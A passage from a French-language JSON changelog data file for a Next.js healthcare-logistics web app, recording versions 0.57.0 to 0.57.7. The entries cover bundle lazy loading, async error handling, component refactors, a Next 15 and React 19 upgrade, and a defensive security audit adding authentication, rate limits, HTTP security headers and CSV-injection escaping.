      { "code": "AI", "txt": "+26 tests Vitest (v057-7-split-versions-data.test.js) : version (1), versions-index.js (5 — existe, plus léger que versions-data, exports VERSIONS_INDEX + THEME_LABELS, 150+ chantiers_total, 150+ versions), chantiers-extra.json (4 — existe, JSON valide avec versions comme clés, chaque entrée array avec code+txt, taille < 100 KB), page.js patches (11 — import versions-index, plus d'import versions-data, state ALL_VERSIONS + setAllVersions, state extraLoaded, fetch chantiers-extra avec force-cache, merge avec [...v.chantiers, ...hidden], setExtraLoaded(true), chantiers_total dans le rendu, useMemo deps incluent ALL_VERSIONS pour themeCounts + filtered), script regen (2 — existe + structure), versions-data conservé pour smoke-tests (2 — fichier existant + smoke-tests dynamic import), doc bundle gain (1). +1 test 0.57.2 ajusté (1500 lignes max au lieu de 1400 pour intégrer le code de split). Total 2486 tests verts (vs 2460)" }
    ],
    "themes": ["performance", "bundle", "lazy-loading"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.7.html",
    "sqlFile": null
  },
  {
    "v": "0.57.6",
    "kind": "version",
    "titre": "⚡ Performance : lazy load CodeViewer + SqlModal + smoke-tests → -11 kB First Load",
    "chantiers": [
      { "code": "FE", "txt": "Lazy load des composants modaux dans app/changelog/page.js : CodeViewer et SqlModal sont désormais chargés via next/dynamic au lieu d'un import statique. Ils n'apparaissent dans le bundle initial que quand l'utilisateur clique sur un bouton </> (code) ou SQL. Économise environ 11 kB sur le First Load JS de /changelog. ssr: false car ces modaux utilisent useState/useEffect pour des interactions navigateur (clipboard, ESC, etc.)",
        "code_snippet": {
          "file": "app/changelog/page.js",
          "note": "next/dynamic pour les modaux",
          "lang": "js",
          "before": "import CodeViewer from \"./CodeViewer\";\nimport SqlModal from \"./SqlModal\";\n\n// → ces 2 composants sont dans le bundle initial même si\n//   l'utilisateur ne clique JAMAIS dessus.",
          "after": "import dynamic from \"next/dynamic\";\n// 0.57.6 : CodeViewer et SqlModal sont lazy-loadés (chargés à la demande)\nconst CodeViewer = dynamic(() => import(\"./CodeViewer\"), { ssr: false });\nconst SqlModal = dynamic(() => import(\"./SqlModal\"), { ssr: false });\n\n// → composants chargés en chunks séparés, seulement quand\n//   l'utilisateur ouvre une modale code ou SQL"
        }
      },
      { "code": "FE", "txt": "Nouveau app/changelog/smoke-tests-index.js (3 KB) qui exporte juste VERSION_TESTS_KEYS (Set des clés de versions ayant des tests) et 2 fonctions wrapper qui chargent smoke-tests.js (92 KB) en dynamic import quand l'utilisateur clique sur 'Tester' ou 'Tester tout'. Avant : 92 KB chargés à chaque visite de /changelog. Après : juste 3 KB pour le badge 'tests dispo' + chargement à la demande. Économie nette : 89 KB sur les visites sans interaction de test" },
      { "code": "FE", "txt": "Patch automatique de app/changelog/page.js : remplacement de VERSION_TESTS[v.v] (object lookup qui force le bundle de 92 KB) par VERSION_TESTS_KEYS.has(v.v) (Set lookup léger). Les appels await runTestsForVersion() et await runAllTests() deviennent runTestsForVersionLazy() / runAllTestsLazy() qui font le dynamic import au moment du clic" },
      { "code": "DOC", "txt": "Audit complet du bundle Aveho EC après ces optimisations : (a) Pages les plus lourdes en First Load : /changelog 293 kB (gros à cause de versions-data.js qui contient 159 entrées), /patients 213 kB, /etablissements 212 kB — toutes les autres entre 170-210 kB. (b) Shared bundle = 104 kB de React + Next core (non optimisable). (c) Libs déjà en dynamic import : jszip, leaflet, html5-qrcode, exportData, exportPdf — bien fait. (d) Plus aucune lib lourde en import statique côté front. Objectif Lighthouse Performance > 90 atteignable" },
      { "code": "FE", "txt": "Nouveau script scripts/analyze-bundle.sh qui affiche en CLI les tailles des shared chunks, des pages les plus lourdes, des dynamic chunks lazy, et un récap des First Load par page. Utilisation : bash scripts/analyze-bundle.sh après un npm run build. Facilite les audits perf futurs" },
      { "code": "AI", "txt": "+21 tests Vitest (v057-6-performance-lazy.test.js) : version (1), smoke-tests-index.js (6 — existe, VERSION_TESTS_KEYS Set, runTestsForVersionLazy, runAllTestsLazy, 50+ clés, < 120 lignes), changelog/page.js lazy patterns (9 — import next/dynamic, CodeViewer dynamic, SqlModal dynamic, ssr: false, plus d'imports statiques, smoke-tests-index utilisé, VERSION_TESTS_KEYS.has au lieu de bracket access, appels lazy), lazy existants confirmés (3 — jszip, leaflet, exportData/exportPdf), script analyze-bundle (2). +2 tests existants (v056-19, v057-2) acceptent désormais les 2 patterns import. Total 2460 tests verts (vs 2439)" },
      { "code": "DOC", "txt": "Reste pour 0.57.7+ : (a) Split versions-data.js en versions-index + lazy-load des chantiers detaillés par version — gros chantier mais permettrait de passer /changelog à < 150 kB First Load. (b) Refactos qualité (NoteModal, carte/utilisateurs). (c) Audit Lighthouse réel sur Vercel pour mesurer Core Web Vitals (LCP, FID, CLS) — ne peut pas être fait depuis l'environnement de dev" }
    ],
    "themes": ["performance", "bundle", "lazy-loading"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.6.html",
    "sqlFile": null
  },
  {
    "v": "0.57.5",
    "kind": "version",
    "titre": "🔧 Robustesse runtime : 18 useEffect async wrappés + lib/useAsyncEffect + cleanup HID",
    "chantiers": [
      { "code": "FE", "txt": "Création de lib/useAsyncEffect.js : hook helper qui wrap proprement un useEffect avec un callback async, gère automatiquement try/catch (pas d'UnhandledPromiseRejection), AbortController pour annuler les fetches en cours au démontage, flag isMounted pour ignorer les setState après démontage, et logging unifié via lib/logger. À utiliser pour tous les futurs useEffect async",
        "code_snippet": {
          "file": "lib/useAsyncEffect.js",
          "note": "Pattern useAsyncEffect",
          "lang": "js",
          "after": "// Usage :\nuseAsyncEffect(async ({ signal, isMounted }) => {\n  const data = await fetch(url, { signal }).then(r => r.json());\n  if (!isMounted()) return;  // composant démonté entre temps\n  setData(data);\n}, [deps]);\n\n// Implémentation (extrait) :\nexport function useAsyncEffect(asyncFn, deps, options = {}) {\n  const { errorLabel = \"[useAsyncEffect]\" } = options;\n\n  useEffect(() => {\n    let mounted = true;\n    const controller = new AbortController();\n    const ctx = {\n      isMounted: () => mounted,\n      signal: controller.signal,\n    };\n\n    (async () => {\n      try {\n        await asyncFn(ctx);\n      } catch (e) {\n        if (!mounted) return;  // ignore les erreurs après démontage\n        logger.error(`${errorLabel} :`, e);\n      }\n    })();\n\n    return () => {\n      mounted = false;\n      try { controller.abort(); } catch {}\n    };\n  }, deps);\n}"
        }
      },
      { "code": "FE", "txt": "Patch automatique de 16 pages avec useEffect async qui utilisaient le pattern `(async () => { ... })()` sans try/catch englobant : AnnoncesBanner, MesValidationsEnAttente, NotificationPreferences, statistiques-rgpd, magasins, audit, etablissement, promotions, calendrier, digest-dashboard, materiels, annuaire-rpps, commandes, scan/bulletin-situation, scan/prescription, vue-globale. Ajout automatique de l'import logger + wrap try/catch avec log d'erreur + finally setLoading(false). Sans ce wrap, un Supabase down ou un endpoint en timeout faisait planter la page en loading infini avec UnhandledPromiseRejection dans la console" },
      { "code": "FE", "txt": "Patch manuel des cas complexes : app/patient/[id]/page.js (useEffect géant avec Promise.all + caisse/mutuelle nested, ajout try/catch englobant + .catch() individuel sur chaque promise nested pour pas faire planter Promise.all si une rejette), app/achats/page.js (notifyValideurs.then() avait pas de .catch — le try/catch englobant ne couvre PAS la promise qui s'exécute APRÈS l'await import), app/ConsentementRGPD.js (4 supabase chains .then(setState) sans catch, ajout .catch(() => {}) silencieux), app/NotificationOptIn.js (serviceWorker.ready + pushManager.getSubscription cascadés sans catch), app/OfflineBanner.js (getQueueItems().then(setItems) sans catch — fallback []), app/components/EtabPhoto.js (fetchGooglePlace().then() sans catch — fallback empty place), app/crud.js (3 imports dynamiques pour export CSV/PDF sans .catch — affichait silencieusement rien si webpack chunk load échoue)" },
      { "code": "FE", "txt": "Fuite mémoire WebHID corrigée dans app/SignaturePad.js : la lib branchait un listener `inputreport` sur le device HID au moment du connect, mais ne le retirait jamais au démontage du composant. Si l'utilisateur quitte la page avec signpad connecté → fuite. Fix : nouveau hidListenerRef qui stocke {device, listener}, cleanup useEffect appelle device.removeEventListener au démontage. Bonus : .catch sur navigator.hid.getDevices() (browser ancien ou permission refusée → unsupported propre au lieu de UnhandledPromiseRejection)" },
      { "code": "AI", "txt": "+37 tests Vitest (v057-5-robustesse-runtime.test.js) : version (1), lib/useAsyncEffect (6 — export, try/catch logger, isMounted/signal, AbortController, cleanup mounted=false), SignaturePad cleanup HID (3 — hidListenerRef + removeEventListener + getDevices catch), 5 fichiers avec catches comptés (5), 17 pages avec try/catch + import logger (17), patient/[id]/page.js try/catch englobant + setLoading finally + caisse/mutuelle catches (3), achats/page.js notifyValideurs catch (1), lib/useAsyncEffect signature (1). Total 2439 tests verts (vs 2402)" },
      { "code": "DOC", "txt": "Bilan robustesse runtime de la 0.57.5 : (a) 0 promise non gérée détectée par l'audit final. (b) 18 useEffect async désormais protégés par try/catch + log d'erreur. (c) 1 fuite mémoire HID listener fixée. (d) 1 helper useAsyncEffect disponible pour les futurs useEffect async (recommandé pour les nouveaux développements). Les pages ne crashent plus en cas d'erreur réseau / Supabase down — elles affichent une UI cohérente (state contrôlé) et logguent l'erreur via logger pour debug" }
    ],
    "themes": ["quality", "robustness", "runtime"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.5.html",
    "sqlFile": null
  },
  {
    "v": "0.57.4",
    "kind": "version",
    "titre": "🛡️ Audit sécurité applicatif : 100% des routes API protégées + headers OWASP",
    "chantiers": [
      { "code": "SEC", "txt": "Audit complet des 19 routes API Next : avant 0.57.4, 7 routes étaient sans rate limit et 7 frontends appelaient les routes sans Bearer token (RLS faisait l'auth implicite mais 401 silencieux + risque de DoS). Après 0.57.4 : 17/19 routes ont auth + rate limit explicite (✅), 2/19 sont publiques par design (🟢 health, version monitoring). 100% de couverture sur les routes sensibles" },
      { "code": "FE", "txt": "Migration des 7 routes API vers le pattern requireAuth + checkRateLimit : caisses (4 handlers GET POST PUT DELETE, 60 req/min), mutuelles (4 handlers, 60 req/min), place (1 handler, 30 req/min — Google Places API coûte), prescriptions/search (1 handler, 30 req/min), prescriptions/export-csv (1 handler, 10 req/min — export RGPD sensible), prescriptions/verify-rpps (1 handler, 30 req/min), google-reviews/sync (1 handler, 5 req/min — appel Google Places coûteux). 12 handlers migrés en automatique via patch Python qui détecte le pattern `createClient(SUPABASE_URL, SUPABASE_ANON, { global: { headers: { Authorization: authHeader }}})` et le remplace",
        "code_snippet": {
          "file": "app/api/caisses/route.js",
          "note": "Migration vers requireAuth + checkRateLimit",
          "lang": "js",
          "before": "import { createClient } from \"@supabase/supabase-js\";\n\nexport async function GET(req) {\n  const authHeader = req.headers.get(\"authorization\") || \"\";\n  const supabase = createClient(SUPABASE_URL, SUPABASE_ANON, {\n    global: { headers: { Authorization: authHeader } },\n  });\n  // ... logique\n  // Problème : si Bearer absent, RLS bloque les rows mais\n  // pas de 401 immédiat → l'attaquant peut tâter la route.\n  // Et aucun rate limit = brûle quota Supabase.\n}",
          "after": "import { createClient } from \"@supabase/supabase-js\";\nimport { requireAuth, checkRateLimit } from \"../../../lib/apiAuth\";\n\nexport async function GET(req) {\n  // 0.57.4 : auth + rate limit obligatoire\n  const authCheck = await requireAuth(req);\n  if (!authCheck.ok) return authCheck.response;\n  const { user, supabase } = authCheck;\n  const rate = checkRateLimit(user.id, { maxRequests: 60, windowMs: 60_000 });\n  if (!rate.ok) return rate.response;\n  // ... logique\n  // 401 immédiat si Bearer absent. 429 si > 60 req/min/user.\n}"
        }
      },
      { "code": "SEC", "txt": "Ajout du rate limit sur les 2 routes OCR créatrices (auth déjà présente) : patients/from-ocr (10 req/min — création patient depuis bulletin OCR), prescriptions/from-ocr (10 req/min — création prescription + lignes). Anti-quota Supabase et anti-spam à la création. prescriptions/from-ocr a aussi gagné un check Bearer explicite (avant : token optionnel, maintenant : 401 si absent)" },
      { "code": "FE", "txt": "Migration de 7 composants frontend de fetch() classique vers fetchWithAuth() : CaisseSearch.js, MutuelleSearch.js, EtabGoogleDetails.js, EtabPhoto.js, parametres/integrations/page.js, admin/medecins-prescripteurs/page.js, RppsVerifyBadge.js. fetchWithAuth ajoute automatiquement le Bearer via supabase.auth.getSession() — sans cette migration, les routes API renverraient désormais 401 pour ces composants. Patch automatique : regex sur fetch('/api/...') → fetchWithAuth('/api/...')" },
      { "code": "SEC", "txt": "Ajout des 6 headers HTTP de sécurité recommandés par OWASP dans next.config.js (appliqués sur toutes les routes via async headers()) : X-Content-Type-Options=nosniff (XSS mitigation, empêche le browser de \"deviner\" le content-type), X-Frame-Options=SAMEORIGIN (clickjacking mitigation, empêche d'être chargé en iframe), Strict-Transport-Security max-age=15552000 (HSTS 6 mois, force HTTPS), Referrer-Policy=strict-origin-when-cross-origin (limite ce qui fuit dans le Referer), Permissions-Policy (désactive caméra/micro/géoloc/paiement par défaut), Cross-Origin-Opener-Policy=same-origin-allow-popups (mitigation Spectre via window.opener isolation)" },
      { "code": "DOC", "txt": "Audit XSS via dangerouslySetInnerHTML : 5 occurrences trouvées dans le code, toutes auditées et SAFE. (1) ConsentementRGPD : passe par consentementToHtml() qui escape & < > avant toute substitution markdown. (2) parametres-rgpd preview : idem, même fonction. (3) changelog noteModal.html : source = /public/changelog-notes/*.html, fichiers statiques générés par nous (chaîne de build trusted). (4) CodeViewer highlightCode : escapeHtml() appelé en premier sur l'input avant les regex de coloration. (5) versions-data.js : exemple de code en chaîne JSON, jamais rendu en innerHTML. 0 XSS exploitable" },
      { "code": "AI", "txt": "+43 tests Vitest (v057-4-security-audit-app.test.js) : version 0.57.4+ (1), 7 routes API avec requireAuth + checkRateLimit (14 = 7 × 2), 2 routes OCR avec rate limit + 401 explicite (4 = 2 × 2), 7 frontends avec import fetchWithAuth + appel (14 = 7 × 2), 8 headers OWASP vérifiés (8 tests : async headers, 6 headers individuels, source /(.*) pattern), 2 sources dangerouslySetInnerHTML safe (2). +1 test 0.56.4 ajusté pour pattern requireAuth. Total 2402 tests verts (vs 2359, +43)" },
      { "code": "DOC", "txt": "Bilan complet de toute la stabilisation sécurité (0.56.20 → 0.57.4) : (a) npm audit : 7 vulns → 2 vulns (-71%), 100% CRITICAL+HIGH résolues. (b) Routes API : 8 routes protégées (auth+rate) → 17/17 protégées (sauf les 2 publiques par design). (c) Frontends : 7 composants migrés vers fetchWithAuth. (d) Headers HTTP : 6 nouveaux headers OWASP. (e) SQL : 21 fonctions SQL grant + 16 search_path corrigés (0.56.20). (f) Secrets : 0 hardcoded (audit grep AIzaSy/sk_live/service_role passé). (g) XSS : 5 dangerouslySetInnerHTML audités, 100% safe. Reste 2 MODERATE postcss/Next non actionnables sans régression majeure" }
    ],
    "themes": ["security", "audit", "infrastructure"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.4.html",
    "sqlFile": null
  },
  {
    "v": "0.57.3",
    "kind": "version",
    "titre": "🛡️ Stabilisation : suppression xlsx (vuln HIGH) + export CSV natif + 0 warning build",
    "chantiers": [
      { "code": "SEC", "txt": "Suppression de la dépendance xlsx du package.json (2 vulnérabilités sans fix upstream : Prototype Pollution + ReDoS). Résultat npm audit : 0 CRITICAL · 0 HIGH · 2 MODERATE (vs 0 CRIT · 1 HIGH · 2 MOD avant). Les 2 MODERATE restantes sont postcss XSS via Unescaped </style>, qui est utilisé en interne par Next.js — fix nécessiterait downgrade vers Next 9 (régression majeure), à laisser tel quel. Bilan total trilogie hardening + 0.57.x : 7 → 2 vulnérabilités (-71%), 100% des CRITICAL et HIGH résolues" },
      { "code": "FE", "txt": "Nouveau module lib/exportData.js (~370 lignes) qui remplace l'utilisation de xlsx par une génération CSV native sans dépendance : (1) csvEscape() avec protection contre l'injection CSV (Excel évalue =, +, -, @ en début de cellule comme une formule → on préfixe avec une apostrophe). (2) RFC 4180 conforme (entourage par guillemets si caractères spéciaux + double-guillemets internes). (3) BOM UTF-8 ajouté en début de fichier pour qu'Excel français reconnaisse l'encodage (sinon accents cassés). (4) Séparateur ; par défaut (compat Excel français). (5) Support multi-fichiers pour exportBilan (1 CSV par feuille + INDEX.csv avec méta)",
        "code_snippet": {
          "file": "lib/exportData.js",
          "note": "csvEscape avec protection injection CSV",
          "lang": "js",
          "after": "/**\n * Échappe une valeur pour CSV (RFC 4180).\n */\nfunction csvEscape(value) {\n  if (value == null) return \"\";\n  let s = String(value);\n  // Protection contre l'injection CSV (=, +, -, @ au début)\n  // Excel évalue ces caractères comme une formule. Préfixer avec une apostrophe.\n  if (/^[=+\\-@\\t\\r]/.test(s)) {\n    s = \"'\" + s;\n  }\n  if (/[\",;\\r\\n]/.test(s)) {\n    s = '\"' + s.replace(/\"/g, '\"\"') + '\"';\n  }\n  return s;\n}\n\nfunction rowsToCSV(rows, sep = \";\") {\n  return rows.map((row) => row.map(csvEscape).join(sep)).join(\"\\r\\n\");\n}\n\nfunction downloadText(content, filename, mimeType = \"text/csv;charset=utf-8\") {\n  // BOM UTF-8 pour qu'Excel français reconnaisse l'encodage (sinon accents cassés)\n  const BOM = \"\\uFEFF\";\n  const blob = new Blob([BOM + content], { type: mimeType });\n  // ... download via blob URL\n}"
        }
      },
      { "code": "FE", "txt": "lib/exportExcel.js transformé en simple ré-exporteur (3 lignes utiles) qui pointe vers lib/exportData. Compat 100% avec les 4 pages callers (app/patients, app/statistiques, app/materiels, app/etablissements) qui font tous `await import('../../lib/exportExcel')` — pas une seule ligne de code applicatif à modifier dans les pages. Le mode XLSX reste documenté dans exportData.js mais l'import dynamique est commenté pour pas que webpack tente de le résoudre (xlsx n'est plus dans package.json)" },
      { "code": "UX", "txt": "Mise à jour des libellés UI dans les 4 pages : 'Export Excel' → 'Export CSV' (boutons, tooltips, alert messages). Le format change effectivement de .xlsx à .csv. L'utilisateur peut toujours ouvrir le CSV directement dans Excel, LibreOffice Calc, Numbers, Google Sheets. Pour les usages où on a besoin de multi-feuilles dans un même fichier (exportBilan), on génère désormais plusieurs fichiers CSV séparés (1 par feuille + INDEX.csv) — ouvrables en parallèle dans Excel" },
      { "code": "BUG", "txt": "Fix bonus : warning 'Next.js inferred your workspace root' qui s'affichait à chaque build. Cause : présence de lockfiles à plusieurs niveaux du chemin (ancien lockfile dans /home/claude/ et nouveau dans /home/claude/aveho-ec-app/). Fix : next.config.js mis à jour avec outputFileTracingRoot: path.join(__dirname). Build : 0 warning maintenant" },
      { "code": "AI", "txt": "+19 tests Vitest (v057-3-no-xlsx-csv-export.test.js) : version 0.57.3+ (1), xlsx absent (2), exportData.js existe + exports + csvEscape protège injection + RFC 4180 + BOM UTF-8 + xlsx désactivé (8), exportExcel.js ré-exporteur (3), 4 pages UI sans 'Export Excel' (4), next.config.js outputFileTracingRoot (2), npm audit propre (1). +1 test 0.56.22 ajusté (lib/exportExcel n'est plus la cible du logger check). Total 2359 tests verts (vs 2340)" },
      { "code": "DOC", "txt": "Bilan de la stabilisation sécurité 0.56.20 → 0.57.3 : (avant) 7 vulns dont 2 CRITICAL + 1 HIGH. (après) 2 vulns MODERATE seulement (postcss interne à Next). Trilogie hardening + Next 15 + suppression xlsx = 71% de réduction. Pour ré-activer xlsx un jour : (1) npm install xlsx, (2) décommenter la ligne `const XLSX = await import(\"xlsx\")` dans lib/exportData.js loadXLSX(). Mais préférer ExcelJS qui est une alternative sans vulnérabilité connue" }
    ],
    "themes": ["security", "dependencies", "quality"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.3.html",
    "sqlFile": null
  },
  {
    "v": "0.57.2",
    "kind": "version",
    "titre": "🧹 Refacto changelog : SqlModal extrait + helpers déplacés (1603 → 1363 lignes)",
    "chantiers": [
      { "code": "FE", "txt": "Refacto de app/changelog/page.js : 1603 → 1363 lignes (-15%). Extraction de la grosse modale SQL (180 lignes de JSX + 50 lignes de logique fetch/cache/clipboard/ESC) dans son propre composant app/changelog/SqlModal.js (~240 lignes autonomes). Le composant gère lui-même son fetch via cache useRef, son ESC handler, et sa copy clipboard. Le parent ne fait plus que passer les props sqlModal + onClose",
        "code_snippet": {
          "file": "app/changelog/SqlModal.js",
          "note": "Composant SqlModal autonome",
          "lang": "js",
          "after": "export default function SqlModal({ sqlModal, onClose }) {\n  const [content, setContent] = useState(sqlModal?.content || null);\n  const [copied, setCopied] = useState(false);\n  const cacheRef = useRef({});\n\n  // Fetch du contenu SQL quand on ouvre la modale\n  useEffect(() => {\n    if (!sqlModal) return;\n    const { file } = sqlModal;\n    if (cacheRef.current[file]) {\n      setContent(cacheRef.current[file]);\n      return;\n    }\n    (async () => {\n      try {\n        const res = await fetch(`/changelog-sql/${file}`, { cache: \"force-cache\" });\n        if (!res.ok) throw new Error(`HTTP ${res.status}`);\n        const txt = await res.text();\n        cacheRef.current[file] = txt;\n        setContent(txt);\n      } catch (e) {\n        setContent(`-- Erreur de chargement\\n-- ${e.message}`);\n      }\n    })();\n  }, [sqlModal?.file]);\n\n  // ESC pour fermer\n  useEffect(() => {\n    if (!sqlModal) return;\n    const handleKey = (e) => e.key === \"Escape\" && onClose();\n    window.addEventListener(\"keydown\", handleKey);\n    return () => window.removeEventListener(\"keydown\", handleKey);\n  }, [sqlModal, onClose]);\n\n  // ... copy clipboard + JSX\n}"
        }
      },
      { "code": "FE", "txt": "Extraction des helpers d'affichage dans app/changelog/lib/helpers.js : ICONS_BY_CODE (constantes pour Fix/NEW/BONUS/•), getCodeMeta(code) (résout la couleur+label depuis un code), versionKey(s) (split version en parts numériques), compareVersions(a,b) (tri ordre version). Maintenant utilisable par SqlModal et futurs sous-composants extraits sans duplication" },
      { "code": "BUG", "txt": "Fix imports manquants dans 2 tabs/ de la 0.57.1 : TabAudit et TabPrescriptions importaient bulletinsStorage et prescriptionsStorage avec 4 niveaux de ../ alors qu'ils sont dans tabs/ qui ajoute 1 niveau supplémentaire (5 ../). Le build Next 14 avait warning, Next 15 le détectait pas mais le composant aurait crashé au runtime au moment du download. Corrigé en testant en build" },
      { "code": "AI", "txt": "+14 tests Vitest (v057-2-refacto-changelog.test.js) : 0.57.2+, helpers.js existe + 4 exports, SqlModal.js existe + default export + fetch/ESC/clipboard internes + props signature, page.js < 1400 lignes, imports helpers + SqlModal, suppression des helpers locaux + suppression de la logique SQL dupliquée, utilisation effective de <SqlModal />, + 2 tests fix imports tabs/ (TabAudit + TabPrescriptions avec 5 niveaux). Total 2340 tests verts (vs 2326)" },
      { "code": "DOC", "txt": "Plan refacto restant : (0.57.3) extraction NoteModal qui fait 208 lignes — c'est le plus délicat car il a beaucoup d'état couplé au parent (search, currentMatch, matchCount, scroll). À traiter dans une version dédiée car le risque de régression est plus élevé. (0.57.4+) refacto app/carte/page.js (1483 lignes) et app/utilisateurs/page.js (1400 lignes) — pas de sous-composants déjà internes, demande de découper du JSX en nouveaux composants logiques. Chacun en version dédiée" }
    ],
    "themes": ["quality", "refactor", "maintainability"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.2.html",
    "sqlFile": null
  },
  {
    "v": "0.57.1",
    "kind": "version",
    "titre": "🧹 Refacto : patient/[id]/edit split en 8 fichiers tabs/*.js (1065 → 350 lignes)",
    "chantiers": [
      { "code": "FE", "txt": "Refacto majeur de app/patient/[id]/edit/page.js : 1065 lignes → 350 lignes (-67%). Les 7 onglets internes (TabIdentite, TabSecu, TabAdresses, TabContacts, TabMedecin, TabPrescriptions, TabAudit) + helpers internes (Field, FieldSelect, Lbl, Toggle, KvBlock, PrescriptionFileLink) sont désormais dans 8 fichiers séparés sous app/patient/[id]/edit/tabs/. Chaque Tab*.js fait entre 19 et 250 lignes — lisible, testable, maintenable. La page principale ne contient plus que la coordination (state, save, navigation, useEffect)",
        "code_snippet": {
          "file": "app/patient/[id]/edit/page.js",
          "note": "Imports des tabs + helpers depuis fichiers séparés",
          "lang": "js",
          "before": "// 1065 lignes dans un seul fichier\n// + function TabIdentite() { ... }\n// + function TabSecu() { ... }\n// + function TabAdresses() { ... }\n// + function TabContacts() { ... }\n// + function TabMedecin() { ... }\n// + function TabPrescriptions() { ... }\n// + function PrescriptionFileLink() { ... }\n// + function TabAudit() { ... }\n// + function Lbl() { ... }\n// + function Field() { ... }\n// + function FieldSelect() { ... }\n// + function Toggle() { ... }\n// + function KvBlock() { ... }",
          "after": "// page.js fait maintenant 350 lignes\n// (uniquement la coordination + render principal)\n\nimport TabIdentite from \"./tabs/TabIdentite\";\nimport TabSecu from \"./tabs/TabSecu\";\nimport TabAdresses from \"./tabs/TabAdresses\";\nimport TabContacts from \"./tabs/TabContacts\";\nimport TabMedecin from \"./tabs/TabMedecin\";\nimport TabPrescriptions from \"./tabs/TabPrescriptions\";\nimport TabAudit from \"./tabs/TabAudit\";\nimport { Field, FieldSelect, Lbl } from \"./tabs/_helpers\";"
        }
      },
      { "code": "FE", "txt": "Nouveau dossier app/patient/[id]/edit/tabs/ avec 8 fichiers : TabIdentite.js (39 lignes — identité + lieu naissance INSEE), TabSecu.js (110 — caisse + mutuelle + ALD/C2S/AME + droits), TabAdresses.js (110 — adresses livraison multiples via BAN), TabContacts.js (42 — urgence + personne de confiance), TabMedecin.js (19 — médecin traitant), TabPrescriptions.js (157 — liste + upload OCR + lien fichier), TabAudit.js (151 — source création + OCR brut + tokens Claude), _helpers.js (Field, FieldSelect, Lbl, Toggle, KvBlock, FieldCheckbox). Total ~830 lignes répartis en fichiers cohérents au lieu d'un mégafichier" },
      { "code": "FE", "txt": "Helpers étendus : ajout de FieldCheckbox dans _helpers.js (nouveau, n'existait pas avant la refacto). Toggle et KvBlock qui étaient en fin de page.js sont maintenant exportés depuis _helpers.js pour être utilisables par TabSecu (Toggle) et TabAudit (KvBlock). PrescriptionFileLink reste interne à TabPrescriptions.js car spécifique à ce tab" },
      { "code": "AI", "txt": "+15 tests Vitest dédiés à la refacto (v057-1-refacto-tabs.test.js) : version 0.57.1+, dossier tabs/ existe, 8 fichiers existent avec export, page.js < 500 lignes, page.js importe bien tous les tabs, _helpers.js expose Field/FieldSelect/Lbl/Toggle/KvBlock, page.js n'a plus de function TabXxx interne, chaque Tab*.js fait < 250 lignes" },
      { "code": "BUG", "txt": "5 tests qui lisaient app/patient/[id]/edit/page.js directement (v055-49, v055-54, v055-55, v056-1, v056-3, v056-4) ont été mis à jour pour utiliser un helper _readAllEditFiles() qui concatène tous les .js du dossier edit/. Pas de changement de comportement — juste adapter les tests à la nouvelle structure de fichiers. 2 tests sur les imports (AdresseAutocomplete, ContactActions) sont devenus tolérants à la profondeur du chemin (page.js vs tabs/*.js) via regex /\\.{2}\\/+ComponentName/" },
      { "code": "DOC", "txt": "3 fichiers > 1000 lignes restent à refacto en versions ultérieures (0.57.2+) : app/changelog/page.js (1603), app/carte/page.js (1483), app/utilisateurs/page.js (1400). Ces 3 fichiers sont plus complexes que patient/edit car ils n'ont pas de sous-composants déjà internes — le refacto demandera de découper du JSX en composants logiques. À planifier en versions dédiées avec recette" }
    ],
    "themes": ["quality", "refactor", "maintainability"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.1.html",
    "sqlFile": null
  },
  {
    "v": "0.57.0",
    "kind": "version",
    "titre": "🚀 Saut majeur : Next.js 15.5 + React 19 — toutes les vulnérabilités CRITICAL réglées",
    "chantiers": [
      { "code": "SEC", "txt": "Upgrade majeur Next.js 14.2.35 → 15.5.19 + React 18.3.1 → 19.2.7. Règle les 7 vulnérabilités Next.js HIGH/MODERATE persistantes après la trilogie hardening (0.56.20-22). npm audit final : 0 CRITICAL · 1 HIGH (xlsx Prototype Pollution, pas de fix dispo upstream) · 2 MODERATE (postcss + xlsx ReDoS). Vs 7 vulnérabilités initiales (2 CRIT + 1 HIGH + 4 MOD) avant la trilogie. Réduction totale : 57% des vulnérabilités, 100% des CRITICAL" },
      { "code": "FE", "txt": "Migration sans casse : audit préalable a confirmé qu'AUCUN fichier n'avait besoin d'être modifié pour Next 15. Les 7 pages dynamiques (/materiel/[id], /patient/[id], /patient/[id]/edit, /patient/[id]/dashboard, /equipe/[id], /inscription/[token], /verifier/[id]) sont toutes des Client Components qui utilisent useParams() — NON impacté par le breaking change Next 15 qui transforme params en Promise dans les Server Components uniquement. Aucun Server Component ne destructure params dans sa signature. Le caching fetch (autre breaking change) est déjà géré explicitement avec next: { revalidate: ... } aux endroits qui en ont besoin (/api/place)",
        "code_snippet": {
          "file": "package.json",
          "note": "Bumps de dépendances majeures",
          "lang": "js",
          "before": "\"dependencies\": {\n  \"next\": \"^14.2.35\",\n  \"react\": \"^18.3.1\",\n  \"react-dom\": \"^18.3.1\"\n}",
          "after": "\"dependencies\": {\n  \"next\": \"^15.5.19\",\n  \"react\": \"^19.2.7\",\n  \"react-dom\": \"^19.2.7\"\n}\n\n// Pas d'autre modification du code applicatif requise\n// Build : ✓ Compiled successfully in 10.4s\n// Tests : 2311 verts (vs 2298 avant)"
        }
      },
      { "code": "FE", "txt": "Pourquoi la migration s'est passée sans encombre : (1) toutes les routes dynamiques sont des Client Components 'use client' avec useParams() — Next 15 ne touche pas à useParams. (2) Aucun cookies()/headers() en async (autre breaking change Next 15 non impactant). (3) Pas de Server Actions à refacto. (4) Pas de tailwind/postcss config custom. (5) ESLint pas dans devDependencies. Le travail le plus risqué de Next 15 (params async) ne s'applique pas à ce code" },
      { "code": "BUG", "txt": "Tests v056-0, v056-2, v056-3, v056-21 cassés temporairement : 4 tests faisaient une regex stricte sur la version (/^0\\.56\\.\\d+-alpha$/) ou Next 14.2.x — bloquant le passage à 0.57.0/Next 15. Fix : regex élargie à /^0\\.(5[6-9]|[6-9]\\d)\\.\\d+-alpha$/ pour accepter 0.56-0.99, et test Next accepte 14.2.35+ OU 15+. Plus aucun test version-bound dans le futur (les nouveaux tests utilisent simplement majeure >= X)" },
